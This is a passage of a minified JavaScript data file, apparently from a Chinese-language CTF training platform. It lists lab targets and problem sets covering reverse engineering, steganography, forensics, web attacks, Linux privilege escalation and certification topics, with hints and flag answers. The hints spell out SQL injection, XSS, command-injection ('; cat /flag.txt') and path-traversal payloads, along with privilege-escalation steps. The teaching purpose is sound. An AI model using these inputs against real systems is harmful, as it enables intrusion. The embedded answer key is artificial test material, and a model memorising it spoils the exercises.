结构","可利用已知 hash(message) 计算 hash(message||padding||extra)","防御：使用 HMAC 而非直接 hash(secret+message)"],docker_run:"docker run -d -p 8116:8116 --name netlearn-target36 netlearn-target36",points:30,estimated_time:"60分钟",solved_count:140},{id:37,name:"XOR 逆向基础",description:"逆向分析 XOR 加密程序，还原密钥解密 Flag。",difficulty:"easy",category:"Reverse",default_port:8117,skills:["逆向","XOR","Ghidra"],solution_steps:["启动靶机：python target37_xor_reverse.py 8117","访问 http://localhost:8117 下载二进制","用 strings 查看可疑字符串","用 Ghidra 反编译，发现 XOR 加密循环","提取硬编码密文和单字节密钥","Python 脚本 XOR 解密获取 Flag"],learn_points:["XOR 加密：ciphertext = plaintext ^ key","Ghidra 反编译查看 C 伪代码","strings 命令提取字符串","单字节 XOR 可暴力破解 256 种可能"],docker_run:"docker run -d -p 8117:8117 --name netlearn-target37 netlearn-target37",points:10,estimated_time:"15分钟",solved_count:1280},{id:38,name:"反调试对抗",description:"程序使用 ptrace 检测调试器，需绕过反调试才能分析逻辑。",difficulty:"hard",category:"Reverse",default_port:8118,skills:["反调试","逆向","GDB"],solution_steps:["启动靶机：python target38_anti_debug.py 8118","访问 http://localhost:8118 下载二进制","运行程序发现提示 'Debugger detected'","用 ltrace 发现调用 ptrace(PTRACE_TRACEME)","用 LD_PRELOAD hook ptrace 返回 0","绕过后分析逻辑，输入正确密码获取 Flag"],learn_points:["反调试技术：ptrace 检测、时间检测、/proc/status 检测","LD_PRELOAD hook 绕过","GDB patch 修改跳转指令","防御：代码混淆、完整性校验"],docker_run:"docker run -d -p 8118:8118 --name netlearn-target38 netlearn-target38",points:30,estimated_time:"60分钟",solved_count:170},{id:39,name:"算法逆向",description:"自定义加密算法，需完整逆向算法逻辑并编写解密程序。",difficulty:"hard",category:"Reverse",default_port:8119,skills:["算法逆向","反编译","Python"],solution_steps:["启动靶机：python target39_algo_reverse.py 8119","访问 http://localhost:8119 下载二进制","用 Ghidra 反编译，识别加密函数","分析算法：位移、异或、查表的组合","用 Python 实现逆向解密算法","运行解密脚本获取 Flag"],learn_points:["自定义算法逆向步骤：反编译→识别逻辑→逆运算","常见操作：循环位移、S-Box 查表、轮函数","工具：Ghidra、IDA Pro、Cutter"],docker_run:"docker run -d -p 8119:8119 --name netlearn-target39 netlearn-target39",points:30,estimated_time:"60分钟",solved_count:130},{id:40,name:"UPX 脱壳",description:"二进制被 UPX 加壳，脱壳后分析获取 Flag。",difficulty:"medium",category:"Reverse",default_port:8120,skills:["脱壳","UPX","逆向"],solution_steps:["启动靶机：python target40_upx.py 8120","访问 http://localhost:8120 下载二进制","用 file 和 strings 发现是 UPX 加壳","执行 upx -d binary 脱壳","用 strings 或 Ghidra 分析脱壳后的二进制","找到硬编码 Flag"],learn_points:["UPX 壳：开源可执行文件压缩工具","upx -d 一键脱壳","其他壳：ASPack、Themida、VMP（需手动脱壳）","工具：DIE（Detect It Easy）识别壳类型"],docker_run:"docker run -d -p 8120:8120 --name netlearn-target40 netlearn-target40",points:20,estimated_time:"30分钟",solved_count:560},{id:41,name:"图片 LSB 隐写",description:"Flag 隐藏在 PNG 图片的最低有效位中，用 zsteg 提取。",difficulty:"easy",category:"Misc",default_port:8121,skills:["隐写术","LSB","图片分析"],solution_steps:["启动靶机：python target41_lsb.py 8121","访问 http://localhost:8121 下载图片","用 zsteg -a flag.png 扫描 LSB 隐写","或用 Stegsolve 查看各通道位平面","发现 LSB 中编码的 Flag","提交 Flag 验证"],learn_points:["LSB 隐写：修改像素最低位不影响视觉","zsteg 自动扫描 PNG/BMP LSB","Stegsolve 手动分析通道","防御：图片签名校验、频域分析"],docker_run:"docker run -d -p 8121:8121 --name netlearn-target41 netlearn-target41",points:10,estimated_time:"15分钟",solved_count:1420},{id:42,name:"文件分离提取",description:"一个文件中嵌入了多个隐藏文件，用 binwalk 提取。",difficulty:"easy",category:"Misc",default_port:8122,skills:["隐写术","binwalk","文件分析"],solution_steps:["启动靶机：python target42_binwalk.py 8122","访问 http://localhost:8122 下载文件","用 file 命令识别文件类型","用 binwalk -e file 提取嵌入文件","在提取的目录中找到 flag.txt","提交 Flag"],learn_points:["binwalk 识别文件中的嵌入数据（魔数扫描）","常见隐藏方式：图片尾追加 ZIP、PNG 嵌入 PDF","foremost 作为 binwalk 替代工具"],docker_run:"docker run -d -p 8122:8122 --name netlearn-target42 netlearn-target42",points:10,estimated_time:"15分钟",solved_count:1380},{id:43,name:"ZIP 伪加密",description:"ZIP 文件被伪加密，修改标志位即可解压。",difficulty:"easy",category:"Misc",default_port:8123,skills:["隐写术","ZIP","伪加密"],solution_steps:["启动靶机：python target43_zip_fake.py 8123","访问 http://localhost:8123 下载 ZIP","解压提示需要密码","用 010 Editor 打开 ZIP，查看本地文件头","将加密标志位 0x09 改为 0x00","解压获取 Flag"],learn_points:["ZIP 伪加密：修改标志位伪造加密状态","ZIP 结构：本地文件头 + 文件数据 + 中央目录","工具：010 Editor、WinHex","真加密需爆破（ARCHPR、hashcat）"],docker_run:"docker run -d -p 8123:8123 --name netlearn-target43 netlearn-target43",points:10,estimated_time:"15分钟",solved_count:1250},{id:44,name:"EXIF 信息提取",description:"Flag 隐藏在图片的 EXIF 元数据中。",difficulty:"easy",category:"Misc",default_port:8124,skills:["隐写术","EXIF","元数据"],solution_steps:["启动靶机：python target44_exif.py 8124","访问 http://localhost:8124 下载图片","用 exiftool flag.jpg 查看所有 EXIF 信息","在 Comment 或 UserComment 字段发现 Base64","Base64 解码获取 Flag","提交 Flag"],learn_points:["EXIF：可交换图像文件信息，含相机型号、GPS、注释","exiftool 提取/修改 EXIF","隐私风险：照片可能泄露位置信息","防御：上传前用 exiftool -all= 清除"],docker_run:"docker run -d -p 8124:8124 --name netlearn-target44 netlearn-target44",points:10,estimated_time:"15分钟",solved_count:1500},{id:45,name:"音频隐写",description:"Flag 隐藏在音频频谱图中，用 Audacity 查看。",difficulty:"medium",category:"Misc",default_port:8125,skills:["隐写术","音频","频谱分析"],solution_steps:["启动靶机：python target45_audio.py 8125","访问 http://localhost:8125 下载 WAV 文件","用 Audacity 打开音频","切换到频谱图视图（Spectrogram）","在频谱图中看到 Flag 文字","提交 Flag"],learn_points:["音频隐写：频谱图隐藏文字/图像","Audacity 频谱分析","其他音频隐写：SSTV、摩尔斯电码、DTMF","工具：Sonic Visualiser、SoX"],docker_run:"docker run -d -p 8125:8125 --name netlearn-target45 netlearn-target45",points:20,estimated_time:"30分钟",solved_count:680},{id:46,name:"PCAP 流量分析",description:"分析 pcap 流量包，提取 HTTP 传输的敏感文件。",difficulty:"medium",category:"Forensics",default_port:8126,skills:["流量分析","Wireshark","取证"],solution_steps:["启动靶机：python target46_pcap.py 8126","访问 http://localhost:8126 下载 pcap 文件","用 Wireshark 打开，过滤 http","发现 POST 请求上传了文件","File → Export Objects → HTTP 导出文件","打开导出的文件获取 Flag"],learn_points:["Wireshark 过滤：http、tcp.port==80、http.request.method==POST","导出 HTTP 对象：File → Export Objects → HTTP","追踪 TCP 流：Follow → TCP Stream","工具：tshark、tcpdump、NetworkMiner"],docker_run:"docker run -d -p 8126:8126 --name netlearn-target46 netlearn-target46",points:20,estimated_time:"30分钟",solved_count:720},{id:47,name:"USB 键盘流量恢复",description:"从 USB 流量中还原键盘输入，获取输入的密码。",difficulty:"hard",category:"Forensics",default_port:8127,skills:["流量分析","USB","取证"],solution_steps:["启动靶机：python target47_usb.py 8127","访问 http://localhost:8127 下载 pcap","用 tshark 提取 USB HID 数据：tshark -r usb.pcap -T fields -e usb.capdata","分析 USB HID 键盘协议，每 8 字节代表一次按键","根据 HID 键码表还原按键序列","输入还原的密码获取 Flag"],learn_points:["USB HID 协议：键盘数据每 8 字节","HID Usage ID 到键盘映射","tshark 提取 USB 数据","应用：键盘记录器取证、鼠标轨迹还原"],docker_run:"docker run -d -p 8127:8127 --name netlearn-target47 netlearn-target47",points:30,estimated_time:"60分钟",solved_count:210},{id:48,name:"内存取证",description:"分析内存镜像，用 Volatility 提取恶意进程和 Flag。",difficulty:"hard",category:"Forensics",default_port:8128,skills:["内存取证","Volatility","取证"],solution_steps:["启动靶机：python target48_memory.py 8128","访问 http://localhost:8128 下载内存镜像","用 volatility 识别系统：volatility -f mem.raw imageinfo","列出进程：vol.py -f mem.raw --profile=Win7SP1x64 pslist","发现可疑进程，dump 其内存","在 dump 文件中搜索 Flag"],learn_points:["Volatility 内存取证框架","常用插件：pslist、netscan、filescan、dumpfiles","内存中可恢复：进程、网络连接、文件、注册表","应用：恶意软件分析、入侵调查"],docker_run:"docker run -d -p 8128:8128 --name netlearn-target48 netlearn-target48",points:30,estimated_time:"60分钟",solved_count:160},{id:49,name:"日志分析",description:"分析 Web 服务器访问日志，识别攻击行为提取 Flag。",difficulty:"medium",category:"Forensics",default_port:8129,skills:["日志分析","取证","攻击识别"],solution_steps:["启动靶机：python target49_log.py 8129","访问 http://localhost:8129 下载日志文件","用 grep 过滤异常请求：grep -E 'union|select|script' access.log","发现 SQL 注入攻击记录","提取注入的 Payload 中的 Flag","提交 Flag"],learn_points:["Apache/Nginx 日志格式分析","常见攻击特征：SQL 注入、XSS、目录遍历","工具：grep、awk、ELK Stack","日志取证：确认攻击时间、来源、手法"],docker_run:"docker run -d -p 8129:8129 --name netlearn-target49 netlearn-target49",points:20,estimated_time:"30分钟",solved_count:540},{id:50,name:"Windows 注册表取证",description:"分析 Windows 注册表，从 SAM 和运行记录中提取 Flag。",difficulty:"hard",category:"Forensics",default_port:8130,skills:["注册表","Windows","取证"],solution_steps:["启动靶机：python target50_registry.py 8130","访问 http://localhost:8130 下载注册表 hive 文件","用 regripper 或 Windows 注册表编辑器分析","从 SAM 提取用户哈希","从 BAM/DAM 查看程序运行记录","在 Run 键或最近文档中发现 Flag"],learn_points:["注册表 hive 文件：SAM、SYSTEM、SOFTWARE、NTUSER.DAT","关键位置：Run 键（自启动）、BAM（程序运行）、Shellbags","工具：RegRipper、Registry Explorer、SE forensics","应用：用户活动取证、持久化后门检测"],docker_run:"docker run -d -p 8130:8130 --name netlearn-target50 netlearn-target50",points:30,estimated_time:"60分钟",solved_count:180}],s={targets:r},i=[{id:1,title:"Web 安全入门题单",description:"适合零基础的安全爱好者，从最简单的查看源码到经典的 SQL 注入、XSS。每道题都有提示和答案。",tags:["Web安全","入门"],difficulty:"easy",problems:[{id:101,title:"HTML 注释里的秘密",type:"信息泄露",difficulty:"easy",description:"访问靶机页面，按 F12 打开开发者工具，在 Elements 面板中寻找 HTML 注释。Flag 就藏在注释中。",hint:"注释格式是 <!-- ... -->，按 Ctrl+U 也可以直接看源码。",answer:"flag{hidden_in_html_comment}",target_id:1,skills:["信息搜集","查看源码"]},{id:102,title:"响应头里的线索",type:"信息泄露",difficulty:"easy",description:"用 curl 访问靶机首页，观察 HTTP 响应头。Server 字段中可能包含敏感信息，或者自定义的 X-Flag 头部。",hint:"curl -I 可以只看响应头。注意寻找以 X- 开头的自定义头部。",answer:"flag{header_leak_x_flag}",target_id:1,skills:["curl","HTTP头分析"]},{id:103,title:"默认路径探测",type:"目录遍历",difficulty:"easy",description:"尝试访问 /robots.txt、/.git/、/backup.zip 等常见敏感路径，看看靶机是否有意外的文件暴露。",hint:"robots.txt 经常暴露管理员路径，一些压缩包可能包含源码。",answer:"flag{robots_exposed_admin}",target_id:1,skills:["目录扫描","敏感文件"]},{id:104,title:"万能密码登录",type:"SQL注入",difficulty:"medium",description:"靶机有一个登录页面，后端用字符串拼接的方式构造 SQL 查询。尝试在用户名输入特殊字符，绕过密码验证。",hint:"试试 admin' -- 或者 ' OR '1'='1。注意单引号的作用是闭合 SQL 语句中的字符串。",answer:"flag{sqli_bypass_login}",target_id:3,skills:["SQL注入","认证绕过"]},{id:105,title:"XSS 弹窗挑战",type:"XSS",difficulty:"medium",description:"靶机的搜索框会直接回显用户输入的内容，没有任何过滤。注入一段 JavaScript 代码，让页面弹出 alert。",hint:"输入 <script>alert('xss')<\/script>，或者尝试用 <img src=x onerror=alert(1)> 绕过过滤。",answer:"flag{xss_reflected_alert}",target_id:4,skills:["XSS","前端注入"]},{id:106,title:"命令拼接读取 Flag",type:"命令注入",difficulty:"medium",description:"靶机提供了一个 ping 工具，用户输入 IP 地址后服务器执行 ping 命令。尝试拼接额外的系统命令来读取 /flag.txt。",hint:"Linux 中可以用 ; 或 | 连接多条命令。例如：127.0.0.1; cat /flag.txt",answer:"flag{cmd_injection_cat_flag}",target_id:5,skills:["命令注入","OS命令执行"]},{id:107,title:"路径穿越读取 passwd",type:"文件包含",difficulty:"medium",description:"靶机通过 URL 参数加载页面文件，如 ?page=about.html。尝试用 ../ 穿越目录，读取服务器的 /etc/passwd 文件。",hint:"../../etc/passwd 可以从当前目录回到根目录。如果过滤了 ../，试试 ....//....//。",answer:"flag{lfi_etc_passwd_read}",target_id:6,skills:["路径穿越","LFI"]}]},{id:2,title:"密码学基础题单",description:"从经典 Caesar 密码到现代哈希碰撞，循序渐进理解密码学原理。",tags:["密码学","Crypto"],difficulty:"medium",problems:[{id:201,title:"Caesar 密码破解",type:"古典密码",difficulty:"easy",description:"一段被 Caesar 移位加密过的文本：sgd vnqkc hr sgd gzud。Caesar 密码把每个字母向前或向后移动固定位数，尝试枚举 1-25 的所有可能。",hint:"尝试在线工具 https://cryptii.com/pipes/caesar-cipher，或者写个 Python 脚本暴力枚举。",answer:"flag{caesar_shift_1}",target_id:null,skills:["古典密码","枚举"]},{id:202,title:"Base64 解码",type:"编码转换",difficulty:"easy",description:"以下字符串是 Base64 编码：ZmxhZ3tiYXNlNjRfZGVjb2RlX29rfQ==。用工具或命令行解码它。",hint:"Linux 命令：echo 'ZmxhZ3tiYXNlNjRfZGVjb2RlX29rfQ==' | base64 -d",answer:"flag{base64_decode_ok}",target_id:null,skills:["Base64","编码"]},{id:203,title:"十六进制转 ASCII",type:"编码转换",difficulty:"easy",description:"66 6c 61 67 7b 68 65 78 5f 74 6f 5f 61 73 63 69 69 7d 是一串十六进制数，每两个十六进制数代表一个 ASCII 字符。",hint:"Python: bytes.fromhex('666c...').decode() 或者用 CyberChef 的 From Hex。",answer:"flag{hex_to_ascii}",target_id:null,skills:["Hex","编码"]},{id:204,title:"MD5 碰撞",type:"哈希",difficulty:"medium",description:"靶机有一个文件校验接口，接受一个文件的 MD5。如果你能让两个不同内容的文件产生相同的 MD5，就能绕过校验。这是著名的 MD5 碰撞攻击。",hint:"搜索 'MD5 collision example'，找一个已知的碰撞对（如 evil.pdf / good.pdf），提交即可。",answer:"flag{md5_collision_found}",target_id:null,skills:["哈希碰撞","MD5"]},{id:205,title:"JWT 密钥破解",type:"JWT",difficulty:"hard",description:"靶机使用 JWT 进行认证，签名密钥是一个很短的弱口令。用字典攻击找出密钥，然后伪造一个 admin 用户的 JWT Token。",hint:"用 jwt_tool 或 hashcat 进行 JWT 密钥爆破。常用弱口令字典 /usr/share/wordlists/rockyou.txt。",answer:"flag{jwt_weak_secret_cracked}",target_id:null,skills:["JWT","字典攻击","认证绕过"]}]},{id:3,title:"网络协议分析题单",description:"通过抓包、协议分析找出网络流量中隐藏的信息。需要 Wireshark 或 tshark。",tags:["网络","协议分析"],difficulty:"medium",problems:[{id:301,title:"HTTP 明文传输",type:"流量分析",difficulty:"easy",description:"在 pcap 文件中，HTTP 登录请求是以明文传输的。用 Wireshark 过滤 http.request.method == POST，找到登录请求，从中提取用户名和密码。",hint:"Wireshark 过滤：http.request.method == POST && http contains login。查看 Packet Details 中的 HTML Form 字段。",answer:"flag{http_plaintext_password}",target_id:null,skills:["Wireshark","HTTP分析"]},{id:302,title:"DNS 隧道中的数据",type:"DNS",difficulty:"medium",description:"攻击者通过 DNS 查询将数据编码到子域名中。在 pcap 中找出异常的 DNS 查询，提取子域名并 Base64 解码。",hint:"过滤 dns 协议，查找大量同一域名的子域名查询。子域名可能是一串 Base64 编码。",answer:"flag{dns_tunnel_exfiltration}",target_id:null,skills:["DNS隧道","数据外泄"]},{id:303,title:"TCP 三次握手分析",type:"TCP/IP",difficulty:"easy",description:"找到 pcap 中一次完整的 TCP 三次握手（SYN -> SYN-ACK -> ACK），记录下目标端口号。端口号拼接起来就是 Flag。",hint:"Wireshark 中右键一个 SYN 包 -> Follow -> TCP Stream，可以看到完整的三次握手。",answer:"flag{tcp_handshake_443}",target_id:null,skills:["TCP/IP","三次握手"]},{id:304,title:"ARP 欺骗检测",type:"ARP",difficulty:"medium",description:"pcap 中记录了 ARP 欺骗攻击。找出哪个 MAC 地址同时声称拥有多个 IP 地址，这就是攻击者的 MAC。",hint:"用 arp.opcode == 2 过滤 ARP 响应包，观察 sender MAC 是否对应了多个不同的 sender IP。",answer:"flag{arp_spoof_detected}",target_id:null,skills:["ARP欺骗","中间人攻击"]}]},{id:4,title:"逆向工程入门题单",description:"从字符串分析到反编译，逐步掌握逆向工程的基础技能。",tags:["逆向","Reverse"],difficulty:"hard",problems:[{id:401,title:"字符串中的 Flag",type:"字符串分析",difficulty:"easy",description:"给定的二进制文件中硬编码了 Flag 字符串。用 strings 命令直接提取可打印字符串。",hint:"Linux 命令：strings target.bin | grep flag",answer:"flag{strings_found_me}",target_id:null,skills:["strings","静态分析"]},{id:402,title:"简单 XOR 加密",type:"逆向分析",difficulty:"medium",description:"程序读取用户输入，用一个固定密钥进行 XOR 加密后与硬编码的密文比较。用 Ghidra 找到密钥和密文，解密得到 Flag。",hint:"在 Ghidra 中搜索 XOR 指令，通常密钥会出现在附近。也可以用 strace/ltrace 跟踪程序执行。",answer:"flag{xor_key_0x42}",target_id:null,skills:["XOR","Ghidra","反编译"]},{id:403,title:"绕过密码校验",type:"Patch",difficulty:"medium",description:"程序要求输入正确的密码才输出 Flag。用 Ghidra 分析校验逻辑，找到跳转到成功分支的条件，用十六进制编辑器把条件跳转改成无条件跳转。",hint:"找到 jz/jnz 指令，把它改成 jmp。或者用 radare2 的 wa 命令直接 patch。",answer:"flag{patched_jump_success}",target_id:null,skills:["Patch","汇编","radare2"]}]},{id:5,title:"CTF Misc 综合题单",description:"杂项题目，包含隐写、编码、文件分析、内存取证等。",tags:["Misc","综合"],difficulty:"medium",problems:[{id:501,title:"图片 LSB 隐写",type:"隐写",difficulty:"easy",description:"一张 PNG 图片中隐藏了信息。使用 zsteg 或 steghide 工具检查图片的 LSB（最低有效位）通道。",hint:"zsteg -a flag.png 会检查所有通道。或者 stegsolve 工具也可以逐通道查看。",answer:"flag{lsb_stego_hidden}",target_id:null,skills:["LSB","隐写","zsteg"]},{id:502,title:"压缩包密码破解",type:"密码破解",difficulty:"easy",description:"一个加密的 ZIP 文件，密码是一个 4 位数字。用 fcrackzip 或 John the Ripper 进行暴力破解。",hint:"fcrackzip -b -c1 -l4 -u flag.zip 可以暴力破解 4 位数字密码。",answer:"flag{zip_4digit_brute}",target_id:null,skills:["ZIP破解","暴力破解"]},{id:503,title:"内存取证找密码",type:"内存取证",difficulty:"medium",description:"一个 Windows 内存转储文件（.dmp/.raw）。用 Volatility 分析进程列表，找到记事本进程并提取其中输入的 Flag。",hint:"volatility -f mem.raw --profile=Win7SP1x64 pslist 查看进程，然后 strings 提取记事本内存内容。",answer:"flag{volatility_notepad_flag}",target_id:null,skills:["Volatility","内存取证"]},{id:504,title:"二维码修复",type:"文件修复",difficulty:"medium",description:"一个损坏的 QR Code 图片，缺少定位角。用图像编辑工具补全定位角，然后扫描二维码获取 Flag。",hint:"QR Code 的左上角、右上角、左下角必须有黑色的定位图案（回字形）。用 GIMP 或 Photoshop 画上去。",answer:"flag{qr_code_repaired}",target_id:null,skills:["二维码","图像修复"]}]},{id:6,title:"Linux 安全操作题单",description:"在 Linux 环境下进行安全相关的命令行操作练习。",tags:["Linux","系统安全"],difficulty:"medium",problems:[{id:601,title:"SUID 提权",type:"权限提升",difficulty:"easy",description:"在 Linux 系统中查找设置了 SUID 位的可执行文件。SUID 允许程序以文件所有者的权限运行，可能被用于提权。",hint:"find / -perm -4000 -type f 2>/dev/null 可以查找所有 SUID 文件。注意 /usr/bin/passwd 是合法的，找非预期的。",answer:"flag{suid_privilege_escalation}",target_id:null,skills:["SUID","权限提升"]},{id:602,title:"定时任务提权",type:"权限提升",difficulty:"medium",description:"查看 /etc/crontab 和用户定时任务，找到一个以 root 身份运行且可被普通用户修改的脚本。修改脚本内容获取 root shell。",hint:"cat /etc/crontab 查看系统定时任务。注意路径是否是可写的。",answer:"flag{cron_privilege_escalation}",target_id:null,skills:["Cron","权限提升"]},{id:603,title:"环境变量劫持",type:"权限提升",difficulty:"medium",description:"一个以 root 运行的脚本调用了系统命令但没有使用绝对路径。劫持 PATH 环境变量，让脚本执行你伪造的命令。",hint:"在可写目录创建同名的恶意命令，然后把该目录加到 PATH 最前面。",answer:"flag{path_hijacking_root}",target_id:null,skills:["PATH劫持","环境变量"]},{id:604,title:"日志分析找入侵者",type:"日志分析",difficulty:"medium",description:"分析 /var/log/auth.log，找出尝试暴力破解 SSH 的 IP 地址，以及成功登录的时间。",hint:"grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn 统计失败来源。",answer:"flag{log_analysis_intruder_found}",target_id:null,skills:["日志分析","SSH安全"]}]},{id:7,title:"网络安全认证考试题单",description:"涵盖 CISSP、Security+、CEH、OSCP 等主流安全认证的核心考点，帮助你系统备考。",tags:["认证考试","CISSP","Security+"],difficulty:"medium",problems:[{id:701,title:"OSI 七层模型对应关系",type:"网络基础",difficulty:"easy",description:"在 OSI 七层模型中，路由器工作在第几层？防火墙通常工作在第几层？SSL/TLS 工作在第几层？",hint:"路由器是网络层（第3层），防火墙可以是网络层或传输层，SSL/TLS 是传输层（第4层）协议。",answer:"flag{osi_router_l3_firewall_l3l4_ssl_l4}",target_id:null,skills:["OSI模型","网络基础"]},{id:702,title:"CIA 三元组",type:"安全基础",difficulty:"easy",description:"信息安全的 CIA 三元组指的是什么？请分别解释 Confidentiality、Integrity、Availability 的含义，并各举一个威胁例子。",hint:"C=机密性（未授权泄露）、I=完整性（未授权篡改）、A=可用性（拒绝服务）。",answer:"flag{cia_confidentiality_integrity_availability}",target_id:null,skills:["安全基础","CIA三元组"]},{id:703,title:"对称加密 vs 非对称加密",type:"密码学",difficulty:"medium",description:"对比对称加密（AES）和非对称加密（RSA）的特点：密钥数量、加密速度、适用场景。HTTPS 握手过程中分别用到了哪种加密？",hint:"对称加密速度快但密钥分发困难；非对称加密用于密钥交换和数字签名。HTTPS 先用非对称加密交换对称密钥，再用对称加密传输数据。",answer:"flag{symmetric_fast_asymmetric_keyexchange}",target_id:null,skills:["密码学","加密算法"]},{id:704,title:"访问控制模型对比",type:"访问控制",difficulty:"medium",description:"对比 MAC（强制访问控制）、DAC（自主访问控制）、RBAC（基于角色的访问控制）三种模型的区别。Linux 文件权限属于哪种？SELinux 属于哪种？",hint:"DAC：资源所有者决定权限；MAC：系统强制策略；RBAC：按角色分配权限。Linux 默认是 DAC，SELinux 是 MAC。",answer:"flag{mac_dac_rbac_linux_dac_selinux_mac}",target_id:null,skills:["访问控制","认证授权"]},{id:705,title:"渗透测试阶段",type:"渗透测试",difficulty:"medium",description:"PTES（渗透测试执行标准）将渗透测试分为哪几个主要阶段？请按顺序列出并简要说明每个阶段的目标。",hint:"前期交互 -> 情报收集 -> 威胁建模 -> 漏洞分析 -> 渗透攻击 -> 后渗透 -> 报告。",answer:"flag{ptes_pre_intel_threat_vuln_exploit_post_report}",target_id:null,skills:["渗透测试","方法论"]},{id:706,title:"OWASP Top 10 2021",type:"Web安全",difficulty:"medium",description:"OWASP Top 10 2021 排名第一和第二的漏洞分别是什么？描述 A01:2021-Broken Access Control 的一种典型攻击场景。",hint:"第一是 Broken Access Control，第二是 Cryptographic Failures。越权访问：普通用户通过修改 URL 参数访问管理员页面。",answer:"flag{owasp2021_a01_accesscontrol_a02_crypto}",target_id:null,skills:["OWASP","Web安全"]},{id:707,title:"日志审计与合规",type:"合规审计",difficulty:"hard",description:"某系统需要满足等保 2.0 三级要求，安全审计功能需要满足哪些具体要求？至少列出 5 条。",hint:"等保 2.0 三级要求：审计范围覆盖所有用户、审计事件类型包括系统运行状态和网络行为、审计记录不可删除修改、审计记录留存不少于 6 个月、定期审计分析。",answer:"flag{grade3_audit_scope_event_integrity_6months_analysis}",target_id:null,skills:["等保","合规审计"]},{id:708,title:"零信任架构核心原则",type:"安全架构",difficulty:"hard",description:"零信任（Zero Trust）安全模型的核心原则是什么？与传统的边界安全模型（城堡护城河）有什么区别？",hint:"核心原则：永不信任，始终验证（Never Trust, Always Verify）。假设网络已被攻破，不区分内外网，所有访问都需要认证授权。",answer:"flag{zero_trust_never_trust_always_verify}",target_id:null,skills:["安全架构","零信任"]}]},{id:8,title:"云安全与容器安全题单",description:"覆盖 AWS/Azure/GCP 云安全、Docker/Kubernetes 安全配置、云原生安全最佳实践。",tags:["云安全","容器安全","K8s"],difficulty:"hard",problems:[{id:801,title:"S3 存储桶公开访问",type:"云配置错误",difficulty:"easy",description:"AWS S3 存储桶的哪些配置错误会导致数据泄露？列举 3 种常见的 S3 安全配置错误。",hint:"1) ACL 设置为 PublicRead；2) Bucket Policy 允许 * 主体访问；3) 关闭 Block Public Access 设置。",answer:"flag{s3_public_acl_policy_blockaccess}",target_id:null,skills:["AWS","云配置"]},{id:802,title:"IAM 最小权限原则",type:"IAM",difficulty:"medium",description:"某开发者在 IAM Policy 中使用了 Action: '*' 和 Resource: '*'，这违反了什么安全原则？正确的做法是什么？",hint:"违反了最小权限原则（Least Privilege）。应该明确指定需要的 Action 和具体的 Resource ARN。",answer:"flag{iam_least_privilege_explicit_action_resource}",target_id:null,skills:["IAM","权限管理"]},{id:803,title:"Docker 容器逃逸",type:"容器安全",difficulty:"medium",description:"Docker 容器逃逸的常见方式有哪些？列举 3 种并说明如何防御。",hint:"1) 特权模式（--privileged）；2) 挂载 Docker Socket；3) 内核漏洞（如 Dirty Cow）。防御：不用特权模式、不挂载敏感路径、及时更新内核。",answer:"flag{docker_escape_privileged_socket_kernel}",target_id:null,skills:["Docker","容器逃逸"]},{id:804,title:"Kubernetes RBAC 配置",type:"K8s安全",difficulty:"medium",description:"K8s 中 ServiceAccount 绑定了 ClusterRole 且拥有 '*' 权限，攻击者获取该 Token 后能做什么？如何限制？",hint:"可以执行集群内任意操作，包括创建 Pod、读取 Secret、删除资源。应创建最小权限 Role，限定 namespace 和资源类型。",answer:"flag{k8s_rbac_least_privilege_namespace_scope}",target_id:null,skills:["Kubernetes","RBAC"]},{id:805,title:"镜像安全扫描",type:"DevSecOps",difficulty:"medium",description:"为什么在部署 Docker 镜像前需要进行安全扫描？列举 2 个常用的镜像扫描工具。",hint:"镜像可能包含已知 CVE 漏洞、恶意软件、敏感凭证泄露。工具：Trivy、Clair、Snyk、Grype。",answer:"flag{image_scan_trivy_clair_cve_malware}",target_id:null,skills:["镜像安全","DevSecOps"]},{id:806,title:"云原生 Supply Chain 安全",type:"供应链安全",difficulty:"hard",description:"SolarWinds 事件暴露了软件供应链攻击的危害。在云原生环境中，从代码到部署的供应链各环节有哪些安全措施？",hint:"1) 代码签名和验证；2) 依赖项安全扫描（SCA）；3) 构建环境隔离和可信；4) 镜像签名（Cosign/Notary）；5) 部署前准入控制（OPA/Kyverno）。",answer:"flag{supply_chain_sign_sca_cosign_admission}",target_id:null,skills:["供应链安全","云原生"]}]},{id:9,title:"红队渗透与APT攻击题单",description:"模拟真实 APT 攻击链，涵盖初始访问、权限维持、横向移动、数据渗出等高级渗透技术。",tags:["红队","APT","高级渗透"],difficulty:"hard",problems:[{id:901,title:"钓鱼邮件社工",type:"社工",difficulty:"easy",description:"攻击者伪造 HR 部门发送钓鱼邮件，诱导员工点击链接。列举 3 个识别钓鱼邮件的方法，以及企业层面的 2 种防御措施。",hint:"识别：检查发件人地址、悬停查看链接真实 URL、注意紧急语气。防御：SPF/DKIM/DMARC 邮件认证、安全意识培训。",answer:"flag{phishing_sender_url_training_spf_dkim}",target_id:null,skills:["社工","钓鱼"]},{id:902,title:"Windows 权限维持",type:"权限维持",difficulty:"medium",description:"攻击者获取 Windows 管理员权限后，列举 3 种常见的权限维持技术，以及如何检测。",hint:"1) 注册表 Run 键（HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run）；2) 计划任务；3) WMI 事件订阅。检测：Autoruns、WMI Explorer、日志审计。",answer:"flag{persistence_registry_run_task_wmi}",target_id:null,skills:["权限维持","Windows"]},{id:903,title:"横向移动：Pass-the-Hash",type:"横向移动",difficulty:"medium",description:"什么是 Pass-the-Hash 攻击？攻击者为什么不需要破解 NTLM Hash 就能横向移动？防御措施有哪些？",hint:"Windows 使用 NTLM Hash 直接进行身份验证，不需要明文密码。防御：启用 LSA 保护、Credential Guard、限制管理员权限、使用 Kerberos。",answer:"flag{pth_ntlm_lsa_protection_credguard}",target_id:null,skills:["横向移动","PtH"]},{id:904,title:"域渗透：Kerberoasting",type:"AD攻击",difficulty:"hard",description:"Kerberoasting 攻击的原理是什么？攻击者如何利用 SPN 获取可离线破解的票据？防御措施有哪些？",hint:"任何域用户都可以请求 SPN 的 TGS 票据，该票据用服务账户密码加密。防御：使用强密码（25+字符）、定期更换、启用 AES 加密、监控异常票据请求。",answer:"flag{kerberoasting_spn_tgs_offline_crack}",target_id:null,skills:["AD安全","Kerberos"]},{id:905,title:"C2 通信隐蔽技术",type:"C2",difficulty:"hard",description:"APT 组织如何隐蔽 C2 通信以绕过防火墙和 IDS？列举 3 种技术并说明检测思路。",hint:"1) DNS 隧道；2) HTTPS 加密通信；3) 域前置（Domain Fronting）。检测：DNS 异常查询分析、TLS 